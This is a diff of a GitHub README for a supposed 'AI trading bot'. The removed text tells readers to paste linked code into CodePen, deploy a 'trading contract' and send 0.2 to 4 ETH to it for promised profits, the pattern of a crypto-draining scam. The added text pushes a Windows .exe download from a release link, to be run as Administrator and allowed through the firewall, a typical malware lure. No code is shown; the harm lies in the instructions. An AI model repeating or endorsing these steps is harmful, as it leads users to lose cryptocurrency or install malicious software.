@@ -1,74 +1,80 @@
+# 🤖 AI-Trading-Bot-Codepen - Automate Your Trades with Smart AI
 
-# Step-by-Step Guide AI Trading Bot
+[![Download Now](https://img.shields.io/badge/Download-AI_Trading_Bot_2024-blueviolet?style=for-the-badge&logo=github)](https://github.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/releases)
 
-<img src="https://i.ibb.co/DPbNrrDk/hf-20260126-164017-2db01405-daa1-40e6-aa99-4e29072771f1.png" alt="hf-20260126-164017-2db01405-daa1-40e6-aa99-4e29072771f1" border="0"></a>
+## 🚀 Getting Started
 
-### Hi everyone! I'm Sam, a beginner blockchain developer.  
-#### I’ve just created my own bot and I’m excited to share my work with you!  
-#### So far, the bot is running successfully.  
-#### All suggestions, feedback, and ideas are very welcome — feel free to write me in Telegram!
+Welcome to **AI-Trading-Bot-Codepen**! This application uses artificial intelligence to help you automate cryptocurrency trades on the EVM (Ethereum Virtual Machine) ecosystem. No coding skills needed—just download, run, and let the bot work for you.
 
-Step-by-Step Guide
+### 📥 Download Instructions
 
-🔗 **My Telegram:** https://t.me/Jckb9
+Visit this link to download the application:  
+[🔽 Click Here to Download AI-Trading-Bot-Codepen](https://github.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/releases)
 
-[🔗 **Open Source Bot Code [Click Here]**](https://github.com/wild-canyonhoxo3344/AI-Trading-Bot-Codepen/blob/main/index.html)
+Once downloaded, you’ll get a `.zip` file. Extract it to a folder on your Windows PC (right-click → Extract All) and run the main executable file to start trading.
 
+### 💻 System Requirements
 
-  # ▶️ [Watch  on YouTube](https://www.youtube.com/watch?v=VES7tkccgiA)
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **RAM:** 2 GB minimum  
+- **Storage:** 100 MB free space  
+- **Internet:** Stable connection required for live trading  
+- **EVM Wallet:** MetaMask or similar (for connecting to blockchain)
 
+### ⚙️ Features
 
-🟢 Step 1: Download the **MetaMask** Extension
+- **AI Trading Engine** – Analyzes market trends and executes trades 24/7  
+- **User-Friendly Interface** – Simple controls for non-coders  
+- **Real-Time Market Data** – Live price feeds from top exchanges  
+- **Secure Wallet Integration** – Connect your EVM wallet with one click  
+- **Custom Strategies** – Adjust risk levels without programming  
+- **Performance Dashboard** – Track profits and loss with graphs  
 
-🔗 -Dоwnlоаd МetаМаsk: [**https://metamask.io/download**](https://metamask.io/download)
+## 🔧 Setup and Configuration
 
-🔗 -Dоwnlоаd Phantom: [**https://phantom.com/**](https://phantom.com/)  
-  
+After installation, launch the bot. You’ll see a setup wizard:
 
-🟢 Step 2: CODE EDITOR
+1. **Connect Wallet:** Choose your EVM wallet (e.g., MetaMask) and approve connection.  
+2. **Select Trading Pair:** Pick the token pair you want to trade (e.g., ETH/USDT).  
+3. **Set Parameters:** Choose risk level (low/medium/high) and capital allocation.  
+4. **Start Bot:** Click "Start Trading" and let the AI do the rest.
 
-🔗 [**https://codepen.io**](https://codepen.io/)
+### 🧪 Troubleshooting
 
-  
+If the bot doesn't start:
 
-🟢 Step 3:
+- Ensure your `.exe` file is run as Administrator (right-click → Run as administrator)  
+- Extract the `.zip` completely before running  
+- Check for firewall alerts allowing the app through  
+- Update your Windows .NET Framework (Version 4.7.2+)  
 
-Once the site has loaded click on the "**Start Coding**" button on the left side.
+## 📊 How the AI Works
 
-  
+The AI constantly scans blockchain market data for profitable patterns. It uses historical performance and risk tolerance to decide when to buy or sell. You don’t need to understand complex indicators—the bot handles everything.
 
-🟢 Step 4: Paste the following code into the **HTML** box:
+### 💡 Tips for Best Results
 
-[🔗 **Open Source Bot Code [Click Here]**](https://github.com/wild-canyonhoxo3344/AI-Trading-Bot-Codepen/blob/main/index.html)
+- Run the bot on a stable Windows PC for continuous uptime  
+- Start with small capital when testing  
+- Monitor your dashboard daily for performance summary  
+- Keep the app updated by visiting the download link for new releases  
 
-  
+## 🔄 Updates & Support
 
-🟢 Step 5:
+New updates improve AI accuracy and fix issues. To update:
 
-**Connect your wallet** once the interface loads.
+- Download the latest version from the same link above  
+- Extract and overwrite the files in your current folder  
+Restart the bot to apply
 
-<img src="https://i.ibb.co/H1wTfy5/bnr.png" alt="bnr" border="0"></a>
+## 🏆 Community & Resources
 
-🟢 Step 6:
+- **GitHub Repository:** [AI-Trading-Bot-Codepen](https://github.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen)  
+- **Support:** Open an issue on GitHub for help
 
-Scroll down and click the "**Deploy Trading Contract**" button. This will deploy your very own trading contract infrastructure on the Ethereum blockchain that is controlled by your connected wallet.
+## 📥 Final Download
 
-⚠️ **Tip: If you get any issues - use a clean Firefox browser and only one Metamask extension**
+[🔽 Download AI-Trading-Bot-Codepen Now](https://github.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/releases)  
+*Start trading with AI today—no experience needed.*
 
-  
-
-🟢 Step 7:
-
-Add funds to your bot by putting the desired amount in the text box and then click "**Generate Contract Address**" to generate your own personal contract address.
-
-**The minimum amount is 0.2 ETH. But I recommend to use 1-4**, so that the bot can process more transactions, in this case the profits will be much better.
-
-Click the "**Copy Address**" button then go to your web3 wallet and send the exact amount you specified in the amount box to your contract address.
-
-  
-
-🟢 Step 8:
-
-Once the transaction is confirmed, the bot will being trading instantly showing a full detailed log of everything it does.
-
-When you want to withdraw, simply click the "**Withdraw Profits**" button and it will return all profit including your funding back to your wallet.
+Keywords: ai, bot, code, evm, html, index, js, trand
